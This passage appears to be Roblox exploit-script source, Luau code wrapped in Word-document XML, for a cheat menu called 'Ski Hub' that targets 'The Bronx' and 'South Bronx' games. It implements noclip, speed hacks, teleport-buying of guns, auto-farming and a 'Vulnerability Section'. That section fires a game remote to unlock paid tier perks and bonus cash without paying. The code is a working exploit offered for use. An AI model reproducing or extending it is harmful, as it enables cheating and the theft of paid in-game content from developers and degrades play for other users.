        <w:t xml:space="preserve">            end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local Prompt = gun:FindFirstChildWhichIsA("ProximityPrompt", true)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            if not Prompt then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                return library.notifications:create_notification({</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    name = "Ski Hub",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    info = "Prompt not found!",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    lifetime = 5</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                })</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            if gun:FindFirstChild("Price") then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if LocalPlayer.stored.Money.Value &lt; gun.Price.Value then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    return library.notifications:create_notification({</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        name = "Ski Hub",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        info = `You are {gun.Price.Value - LocalPlayer.stored.Money.Value} short.`,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        lifetime = 5</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    })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local HRP = LocalPlayer.Character.HumanoidRootPart</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local OldCFrame = HRP.CFrame</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local BuyPos = (Prompt.Parent:IsA("BasePart") and Prompt.Parent.CFrame) </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                or (gun.PrimaryPart and gun.PrimaryPart.CFrame) </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                or OldCFrame</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            SmartTP(BuyPos)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            task.wait(0.05)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            pcall(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                Prompt.MaxActivationDistance = 25</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            task.wait(0.1)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local gotItem = false</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local check = LocalPlayer.Backpack.ChildAdded:Connect(function(child)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if child.Name == gunName then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    gotItem = true</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            task.delay(1.2, function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                gotItem = true</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            repeat</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                task.wait(0.02)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                fireproximityprompt(Prompt, 1)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            until gotItem</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            check:Disconnect()</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            SmartTP(OldCFrame)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            library.notifications:create_notification({</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                name = "Ski Hub",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                info = gunName .. " Purchased!",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                lifetime = 5</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            })</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    })</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>quickbuysec:button({</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    name = "Bandage",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    callback = function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        ShopRemote2:InvokeServer("Bandage")</w:t>
      </w:r>
    </w:p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"Bandage Purchased!",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            lifetime = 5</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        })</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>quickbuysec:button({</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    name = "Lemonade",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    callback = function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        ExoticShopRemote:InvokeServer("Lemonade") </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        library.notifications:create_notification({</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            name = "Ski Hub",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            info = "Lemonade Purchased!",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            lifetime = 5</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        })</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                PurchaseGunColumn = PurchaseGunTab:column({})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local TeleportListSection = PurchaseGunColumn:section({name = "Teleport To Location", side = "right", size = 1, icon = GetImage("World.png")})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local List = {}</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                for Index, Value in Config.TheBronx.TeleportationList do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    table.insert(List, Index)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                table.sort(List)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                TeleportListSection:list({flag = "TeleportToPlace_TheBronx", options = List, callback = function(state)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    task.spawn(LPH_NO_VIRTUALIZE(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if not state then</w:t>
      </w:r>
    </w:p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Teleport(Config.TheBronx.TeleportationList[state])</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        library.notifications:create_notification({</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            name = "Ski Hub",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            info = `Successfully teleported to {state}!`,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            lifetime = 5</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        })</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    end))</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end})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>
      <w:r>
        <w:t>end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>if Game_Name == "South Bronx" then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    window:seperator({name = ""}) do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        local LocalPlayerTab, PlayersTab, PurchaseGunTab = window:tab({name = "Main", tabs = {"Local Player", "Players", "Teleports"}, icon = GetImage("World.png")}) do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            do -- \\ Local Player</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local LocalPlayerColumn = LocalPlayerTab:column({})</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local LocalPlayerModsSection = LocalPlayerColumn:section({name = "Local Player Modifications", side = "left", size = 0.475})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local __Modifications = {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    "Infinite Stamina";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    "Instant Interact";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    "Delete On Key";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    "Hide Name";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    "No Clip";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    "Speed";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                }</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                for _, Index in __Modifications do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    LocalPlayerModsSection:toggle({type = "toggle", name = Index, flag = Index.."_SB", default = false, callback = Index ~= "No Clip" and LPH_NO_VIRTUALIZE(function(Value)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            Index = string.gsub(Index, " ", "")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            Config.South_Bronx.LocalPlayer_Config[Index] = Value</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        end) or function(Value)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            if Value and not Solara then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                RunService:BindToRenderStep("NOCLIP", 1, LPH_NO_VIRTUALIZE(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                        if LocalPlayer.Character.Humanoid.Health ~= 0 then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                            for Index, Value in LocalPlayer.Character:GetDescendants() do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                                if Collide_Data[Value.Name] then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                                    pcall(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                                        Value.CanCollide = false</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                                    end)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                                end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                            end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                        else</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                            for Index, Value in LocalPlayer.Character:GetDescendants() do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                                if Collide_Data[Value.Name] then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                                    pcall(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                                        Value.CanCollide = true</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                                    end)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                                end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                            end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                        end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                end))</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            else</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                RunService:UnbindFromRenderStep("NOCLIP")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                for Index, Value in LocalPlayer.Character:GetDescendants() do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    if Collide_Data[Value.Name] then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                        pcall(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                            Value.CanCollide = true</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                        end)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>
      <w:r>
        <w:t xml:space="preserve">                            end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    end})</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                LocalPlayerModsSection = LocalPlayerColumn:section({name = "Modification Settings", side = "left", size = 0.275, icon = GetImage("Settings.png")})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                LocalPlayerModsSection:slider({name = "WalkSpeed Value", flag = "WalkSpeedValue_SouthBronx", min = 0, max = 50, default = 25, suffix = "%", callback = function(state)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Config.South_Bronx.LocalPlayer_Config.SpeedValue = state/100</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                LocalPlayerModsSection:keybind({name = "Delete + Click Key", flag = "DeleteOnKey_SouthBronx", key = Enum.KeyCode.LeftControl, mode = "Hold", callback = function(state)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Config.South_Bronx.LocalPlayer_Config.DeleteKey = library.flags["DeleteOnKey_SouthBronx"].key</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                TeleportMethodSection = LocalPlayerColumn:section({name = "Teleportation Method", side = "left", size = 0.175, icon = GetImage("Wrench.png")})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                TeleportMethodSection:dropdown({name = "Select Method", flag = "TeleportMethod_SB", width = 100, items = {"Dirt Bike", "Damage", "Tween"}, seperator = false, multi = false, default = "Damage", callback = function(state)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Config.South_Bronx.TeleportMethod = state</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                LocalPlayerColumn = LocalPlayerTab:column({})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local VulnSection = LocalPlayerColumn:section({name = "Vulnerability Section", side = "right", size = 0.23 , icon = GetImage("unlocked.png")})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local _OwnedHotChips = LocalPlayer:GetAttribute("ExtraHotChipsMoneyEnabled")</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local OwnedHotChips = _OwnedHotChips</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local _Tiers = {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    ["TIER_1"] = LocalPlayer:GetAttribute("TIER_1");</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    ["TIER_2"] = LocalPlayer:GetAttribute("TIER_2");</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    ["TIER_3"] = LocalPlayer:GetAttribute("TIER_3");</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                }</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local Tiers = {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    ["TIER_1"] = LocalPlayer:GetAttribute("TIER_1");</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    ["TIER_2"] = LocalPlayer:GetAttribute("TIER_2");</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    ["TIER_3"] = LocalPlayer:GetAttribute("TIER_3");</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                }</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local _ScriptLoaded = false;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                VulnSection:toggle({name = "Free Tier 1, 2 and 3", default = false, flag = "Free_Tiers", type = 'toggle', callback = function(state)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if not _ScriptLoaded then return end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    for Index, Value in Tiers do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if _Tiers[Index] then continue end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        local Arguments = {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            [1] = "UpdateSettingAttribute",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            [2] = {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                ["Attribute"] = Index,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                ["Enabled"] = Tiers[Index]</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            }</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        }</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        FireServer(ReplicatedStorage:WaitForChild("RemoteEvents"):WaitForChild("ClientEffects"), table.unpack(Arguments))       </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Tiers[Index] = not Tiers[Index]</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                VulnSection:toggle({name = "Free Extra Hot Chips Cash", default = false, flag = "Free_Chips", type = 'toggle', callback = function(state)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if not _ScriptLoaded then return end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    local Arguments = {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        [1] = "UpdateSettingAttribute",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        [2] = {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            ["Attribute"] = "ExtraHotChipsMoneyEnabled",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            ["Enabled"] = OwnedHotChips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    </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    FireServer(ReplicatedStorage:WaitForChild("RemoteEvents"):WaitForChild("ClientEffects"), table.unpack(Arguments))       </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    OwnedHotChips = not OwnedHotChips</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local FarmSection = LocalPlayerColumn:section({name = "Auto Farming Section", side = "right", size = 0.54, icon = GetImage("Wheatt.png")})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                FarmSection:toggle({name = "Auto-Farm Cards", default = false, flag = "Card_Auto_Farm", type = "toggle", callback = function(state)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    task.spawn(function() if not _ScriptLoaded then return end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if Config.South_Bronx.OwnedBike == "Unknown" then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            local Bike = Find_Bike()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            if Bike == nil then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                ReplicatedStorage:WaitForChild("RemoteEvents"):WaitForChild("Dealershipinteraction"):FireServer("Spawn", "DirtBike")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                task.wait(1)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                Bike = Find_Bike()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                task.wait(1)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                if Bike == nil then Config.South_Bronx.OwnedBike = "No" else Config.South_Bronx.OwnedBike = "Yes" end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            else</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                Config.South_Bronx.OwnedBike = "Yes"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            task.wait(0.5)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Config.South_Bronx.FarmingUtilities.CardFarm = state</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if state then Start_CardFarm() else Stop_CardFarm() end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    end)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                FarmSection:toggle({name = "Auto-Farm Boxes", default = false, flag = "Box_Auto_Farm", type = "toggle", callback = function(state)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if not _ScriptLoaded then return end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Config.South_Bronx.FarmingUtilities.BoxFarm = state</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if state then Start_BoxFarm() else Stop_BoxFarm() end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                FarmSection:toggle({name = "Auto-Farm Chips", default = false, flag = "Chip_Auto_Farm", type = "toggle", callback = function(state)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    task.spawn(function() if not _ScriptLoaded then return end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if Config.South_Bronx.OwnedBike == "Unknown" then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            local Bike = Find_Bike()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            if Bike == nil then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
